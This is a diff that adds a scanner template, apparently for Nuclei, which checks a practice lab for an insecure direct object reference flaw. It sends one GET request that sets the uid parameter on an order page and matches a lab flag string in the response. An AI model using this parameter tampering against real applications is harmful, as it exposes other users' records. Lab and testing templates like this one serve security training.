@@ -1,0 +1,22 @@
+id: vulnlab-idor-medium
+
+info:
+  name: VulnLab IDOR medium 档（uid 参数可改）
+  author: hediwen
+  severity: high
+  tags: vulnlab,idor
+
+http:
+  - raw:
+      - |
+        GET /idor/medium.php?order_id=1003&uid=3 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{idor_horizontal_escalation}"
+
